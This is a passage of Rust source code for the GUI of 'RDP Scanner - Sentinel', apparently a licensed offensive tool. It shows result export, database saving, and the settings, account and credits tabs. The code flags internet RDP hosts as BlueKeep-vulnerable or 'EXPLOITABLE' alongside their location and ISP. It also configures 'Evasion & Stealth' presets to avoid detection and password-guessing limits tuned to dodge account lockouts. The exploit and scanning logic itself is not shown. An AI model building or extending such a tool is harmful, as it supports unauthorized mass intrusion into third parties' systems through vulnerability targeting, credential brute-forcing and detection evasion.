                    
                    // Clean up after 5 seconds
                    let temp_file_clone = temp_file.clone();
                    std::thread::spawn(move || {
                        std::thread::sleep(Duration::from_secs(5));
                        let _ = std::fs::remove_file(&temp_file_clone);
                    });
                }
            }
        }
    }
    
    fn export_results(&self) {
        let all_results = self.checked_results.lock().unwrap();
        
        // Filter results based on export filter
        let filtered_results: Vec<&CheckedResult> = all_results.iter().filter(|r| {
            match self.export_filter {
                OsFilter::All => true,
                OsFilter::Desktop => r.os.contains("Desktop"),
                OsFilter::Server => r.os.contains("Server"),
            }
        }).collect();
        
        if filtered_results.is_empty() {
            return;
        }
        
        // Create export content
        let mut content = String::from("RDP Scanner - Export Results\n");
        content.push_str("================================\n\n");
        
        let filter_name = match self.export_filter {
            OsFilter::All => "All Results",
            OsFilter::Desktop => "Windows Desktop Only",
            OsFilter::Server => "Windows Server Only",
        };
        content.push_str(&format!("Filter: {}\n", filter_name));
        content.push_str(&format!("Total Results: {}\n", filtered_results.len()));
        content.push_str(&format!("Export Date: {}\n\n", chrono::Local::now().format("%Y-%m-%d %H:%M:%S")));
        content.push_str("================================\n\n");
        
        for (idx, result) in filtered_results.iter().enumerate() {
            content.push_str(&format!("Result #{}\n", idx + 1));
            content.push_str(&format!("IP:Port: {}\n", result.ip));
            content.push_str(&format!("Status: {}\n", result.status));
            content.push_str(&format!("Operating System: {}\n", result.os));
            content.push_str(&format!("Country: {}\n", result.country));
            content.push_str(&format!("City: {}\n", result.city));
            content.push_str(&format!("Region: {}\n", result.region));
            content.push_str(&format!("ISP: {}\n", result.isp));
            content.push_str(&format!("BlueKeep Vulnerable: {}\n", if result.bluekeep_vulnerable { "YES" } else { "NO" }));
            content.push_str(&format!("Critical Vulnerability: {}\n", if result.has_critical_vulnerability { "YES - EXPLOITABLE" } else { "NO" }));
            content.push_str("\n");
        }
        
        // Save to file with timestamp
        let filename = format!("rdp_export_{}.txt", chrono::Local::now().format("%Y%m%d_%H%M%S"));
        let _ = std::fs::write(&filename, content);
    }
    
    fn show_settings_tab(&mut self, ui: &mut egui::Ui) {
        ui.heading("⚙️ Settings");
        ui.add_space(20.0);
        
        // Theme settings
        ui.group(|ui| {
            ui.heading("Appearance");
            ui.add_space(10.0);
            
            ui.horizontal(|ui| {
                ui.label("Theme:");
                ui.add_space(10.0);
                
                if ui.selectable_label(!self.dark_mode, "☀️ Light Mode").clicked() {
                    self.dark_mode = false;
                }
                
                if ui.selectable_label(self.dark_mode, "🌙 Dark Mode").clicked() {
                    self.dark_mode = true;
                }
            });
            
            ui.add_space(5.0);
            ui.label("Change the application theme between light and dark mode.");
        });
        
        ui.add_space(20.0);
        
        // Advanced Scanner Settings
        ui.group(|ui| {
            ui.heading("🔬 Advanced Scanner");
            ui.add_space(10.0);
            
            ui.horizontal(|ui| {
                ui.label("Custom Port:");
                ui.text_edit_singleline(&mut self.custom_port);
                ui.label("(Default: 3389)");
            });
            
            ui.add_space(5.0);
            
            ui.checkbox(&mut self.enable_ipv6, "Enable IPv6 Support");
            ui.label("Scan IPv6 addresses in addition to IPv4");
            
            ui.add_space(5.0);
            
            if ui.button("Apply Port Settings").clicked() {
                if let Ok(port) = self.custom_port.parse::<u16>() {
                    self.advanced_scanner.custom_port = port;
                }
                self.advanced_scanner.enable_ipv6 = self.enable_ipv6;
            }
        });
        
        ui.add_space(20.0);
        
        // Evasion Settings
        ui.group(|ui| {
            ui.heading("🥷 Evasion & Stealth");
            ui.add_space(10.0);
            
            ui.checkbox(&mut self.enable_evasion, "Enable Evasion Techniques");
            ui.label("Add delays and randomization to avoid detection");
            
            ui.add_space(10.0);
            
            if self.enable_evasion {
                ui.label("Evasion Preset:");
                ui.horizontal(|ui| {
                    if ui.button("🐌 Stealth").clicked() {
                        self.evasion_config = evasion::EvasionConfig::stealth();
                    }
                    if ui.button("⚖️ Balanced").clicked() {
                        self.evasion_config = evasion::EvasionConfig::balanced();
                    }
                    if ui.button("⚡ Fast").clicked() {
                        self.evasion_config = evasion::EvasionConfig::fast();
                    }
                });
                
                ui.add_space(5.0);
                ui.label(format!("Current delay: {} - {} ms", 
                    self.evasion_config.min_delay_ms, 
                    self.evasion_config.max_delay_ms));
            }
        });
        
        ui.add_space(20.0);
        
        // Credential Testing Settings
        ui.group(|ui| {
            ui.heading("🔐 Credential Testing");
            ui.add_space(10.0);
            
            ui.horizontal(|ui| {
                ui.label("Max Attempts Per User:");
                let mut max_attempts = self.credential_tester.max_attempts_per_user.to_string();
                ui.text_edit_singleline(&mut max_attempts);
                if let Ok(val) = max_attempts.parse::<u32>() {
                    self.credential_tester.max_attempts_per_user = val;
                }
            });
            
            ui.add_space(5.0);
            
            ui.horizontal(|ui| {
                ui.label("Delay Between Attempts (ms):");
                let mut delay = self.credential_tester.delay_between_attempts_ms.to_string();
                ui.text_edit_singleline(&mut delay);
                if let Ok(val) = delay.parse::<u64>() {
                    self.credential_tester.delay_between_attempts_ms = val;
                }
            });
            
            ui.add_space(5.0);
            ui.label("⚠️ Higher delays reduce account lockout risk");
        });
        
        ui.add_space(20.0);
        
        // About section
        ui.group(|ui| {
            ui.heading("About");
            ui.add_space(10.0);
            
            ui.label(egui::RichText::new("RDP Scanner - Sentinel").size(16.0).strong());
            ui.label("Version 1.0.0");
            ui.add_space(10.0);
            
            ui.label("A high-performance RDP scanner with advanced features.");
            ui.add_space(10.0);
            
            if ui.button("📜 View Credits").clicked() {
                self.show_credits = true;
            }
        });
        
        ui.add_space(20.0);
        
        // Performance info
        ui.group(|ui| {
            ui.heading("Performance");
            ui.add_space(10.0);
            
            egui::Grid::new("perf_grid")
                .num_columns(2)
                .spacing([20.0, 8.0])
                .show(ui, |ui| {
                    ui.label("Default Threads:");
                    ui.label("500");
                    ui.end_row();
                    
                    ui.label("Default Timeout:");
                    ui.label("0.3 seconds");
                    ui.end_row();
                    
                    ui.label("Expected Speed:");
                    ui.label("~200+ IPs/sec");
                    ui.end_row();
                });
        });
        
        // Credits window
        if self.show_credits {
            egui::Window::new("📜 Credits")
                .id(egui::Id::new("credits_window"))
                .collapsible(false)
                .resizable(false)
                .default_width(400.0)
                .show(ui.ctx(), |ui| {
                    ui.vertical_centered(|ui| {
                        ui.add_space(10.0);
                        ui.heading("RDP Scanner - Sentinel");
                        ui.add_space(20.0);
                        
                        ui.label(egui::RichText::new("Created by").size(14.0));
                        ui.add_space(5.0);
                        ui.label(egui::RichText::new("@larpexe").size(18.0).strong().color(egui::Color32::from_rgb(34, 139, 34)));
                        ui.label(egui::RichText::new("nullvex").size(18.0).strong().color(egui::Color32::from_rgb(34, 139, 34)));
                        ui.label(egui::RichText::new("@hvncd").size(18.0).strong().color(egui::Color32::from_rgb(34, 139, 34)));
                        ui.add_space(20.0);
                        
                        ui.separator();
                        ui.add_space(10.0);
                        
                        ui.label("Converted from Python to Rust");
                        ui.label("with advanced GUI and features");
                        ui.add_space(20.0);
                        
                        if ui.button("❌ Close").clicked() {
                            self.show_credits = false;
                        }
                    });
                });
        }
    }
    
    fn show_account_tab(&mut self, ui: &mut egui::Ui) {
        ui.heading("👤 Account");
        ui.add_space(20.0);
        
        ui.group(|ui| {
            ui.heading("Account Information");
            ui.add_space(10.0);
            
            egui::Grid::new("account_grid")
                .num_columns(2)
                .spacing([20.0, 8.0])
                .striped(true)
                .show(ui, |ui| {
                    ui.label(egui::RichText::new("Access Key:").strong());
                    ui.label("@hvncd");
                    ui.end_row();
                    
                    ui.label(egui::RichText::new("Status:").strong());
                    ui.label("Active");
                    ui.end_row();
                });
            
            ui.add_space(10.0);
        });
        
        ui.add_space(20.0);
        
        ui.group(|ui| {
            ui.heading("Application Information");
            ui.add_space(10.0);
            
            ui.label("RDP Scanner - Sentinel Edition");
            ui.label("Version 1.0.0");
        });
        
        ui.add_space(20.0);
        
        if ui.button("🚪 Logout").clicked() {
            self.auth_state = AuthState::Login;
            self.license_key.clear();
            self.auth_error.clear();
        }
    }
    
    // New helper functions for enhanced features
    fn save_results_to_database(&self) {
        if let Some(db) = &self.database {
            let results = self.checked_results.lock().unwrap();
            let now = chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
            
            for result in results.iter() {
                let parts: Vec<&str> = result.ip.split(':').collect();
                let (ip, port) = if parts.len() == 2 {
                    (parts[0].to_string(), parts[1].parse().unwrap_or(3389))
                } else {
                    (result.ip.clone(), 3389)
                };
                
                let record = database::ScanRecord {
                    id: None,
                    ip,
                    port,
                    status: result.status.clone(),
                    os: result.os.clone(),
                    location: result.location.clone(),
                    country: result.country.clone(),
                    city: result.city.clone(),
                    isp: result.isp.clone(),
                    nla_disabled: result.nla_disabled,
                    bluekeep_vulnerable: result.bluekeep_vulnerable,
                    critical_vulnerability: result.has_critical_vulnerability,
                    scan_date: now.clone(),
                };
                
                let _ = db.insert_scan(&record);
            }
            
            // Show notification
            self.notifier.notify(
                notifications::NotificationType::ScanComplete,
                &format!("Saved {} results to database", results.len())
            );
        }
    }
    
    fn export_results_enhanced(&self) {
        let results = self.checked_results.lock().unwrap();
        
        if results.is_empty() {
            return;
        }
        
        // Convert to export format
        let export_results: Vec<export::CheckedResult> = results.iter().map(|r| {
            export::CheckedResult {
                ip: r.ip.clone(),
                status: r.status.clone(),
                os: r.os.clone(),
                location: r.location.clone(),
                isp: r.isp.clone(),
                country: r.country.clone(),
                city: r.city.clone(),
                region: r.region.clone(),
                bluekeep_vulnerable: r.bluekeep_vulnerable,
                nla_disabled: r.nla_disabled,
                has_critical_vulnerability: r.has_critical_vulnerability,
            }
        }).collect();
        
        let timestamp = chrono::Local::now().format("%Y%m%d_%H%M%S");
        
        let result = match self.export_format {
            ExportFormat::Csv => {
                let filename = format!("rdp_export_{}.csv", timestamp);
                export::export_to_csv(&export_results, &filename)
            }
            ExportFormat::Json => {
                let filename = format!("rdp_export_{}.json", timestamp);
                export::export_to_json(&export_results, &filename)
            }
            ExportFormat::Txt => {
                let filename = format!("rdp_export_{}.txt", timestamp);
                export::export_to_txt(&export_results, &filename)
            }
            ExportFormat::IpsOnly => {
                let filename = format!("rdp_ips_{}.txt", timestamp);
                export::export_ips_only(&export_results, &filename)
            }
        };
        
        if result.is_ok() {
            self.notifier.notify(
                notifications::NotificationType::ScanComplete,
                "Results exported successfully!"
            );
        }
    }
    
    fn show_export_dialog_window(&mut self, ctx: &egui::Context) {
        let mut close_dialog = false;
        let mut do_export = false;
        
        egui::Window::new("📤 Export Results")
            .id(egui::Id::new("export_results_dialog"))
            .collapsible(false)
            .resizable(false)
            .default_width(400.0)
            .show(ctx, |ui| {
                ui.heading("Export Configuration");
                ui.separator();
                ui.add_space(10.0);
                
                ui.label("Select export format:");
                ui.add_space(10.0);
                
                ui.horizontal(|ui| {
                    if ui.selectable_label(matches!(self.export_format, ExportFormat::Csv), "📊 CSV").clicked() {
                        self.export_format = ExportFormat::Csv;
                    }
                    
                    if ui.selectable_label(matches!(self.export_format, ExportFormat::Json), "📋 JSON").clicked() {
                        self.export_format = ExportFormat::Json;
                    }
                    
                    if ui.selectable_label(matches!(self.export_format, ExportFormat::Txt), "📄 TXT").clicked() {
                        self.export_format = ExportFormat::Txt;
                    }
                    
                    if ui.selectable_label(matches!(self.export_format, ExportFormat::IpsOnly), "🔢 IPs Only").clicked() {
                        self.export_format = ExportFormat::IpsOnly;
                    }
                });
                
                ui.add_space(15.0);
                
                let results_count = self.checked_results.lock().unwrap().len();
                ui.label(format!("Results to export: {}", results_count));
                
                ui.add_space(15.0);
                ui.separator();
                ui.add_space(10.0);
                
                ui.horizontal(|ui| {
                    if ui.button("✅ Export").clicked() && results_count > 0 {
                        do_export = true;
                    }
                    
                    if ui.button("❌ Cancel").clicked() {
                        close_dialog = true;
                    }
                });
                
                if results_count == 0 {
                    ui.add_space(5.0);
                    ui.colored_label(
                        egui::Color32::from_rgb(255, 165, 0),
                        "⚠️ No results to export"
                    );
                }
            });
        
        if close_dialog {
            self.show_export_dialog = false;
        }
        
        if do_export {
            self.export_results_enhanced();
            self.show_export_dialog = false;
        }
    }
}

fn main() -> Result<(), eframe::Error> {
    println!("Starting RDP Scanner...");
    
    // Initialize security with polymorphic seed
    let security_seed = rand::random::<u64>();
    println!("Initializing security...");
    security::initialize_security_with_seed(security_seed);
    println!("Security initialized.");
    
    println!("Starting GUI...");
    
    let options = eframe::NativeOptions {
        viewport: egui::ViewportBuilder::default()
            .with_inner_size([900.0, 600.0])
            .with_resizable(true)
            .with_maximize_button(true)
            .with_visible(true)
            .with_active(true),
        ..Default::default()
    };

    println!("Launching eframe...");
    eframe::run_native(
        "RDP Scanner - Sentinel",
        options,
        Box::new(|_cc| Ok(Box::new(RdpScannerApp::default()))),
    )
}

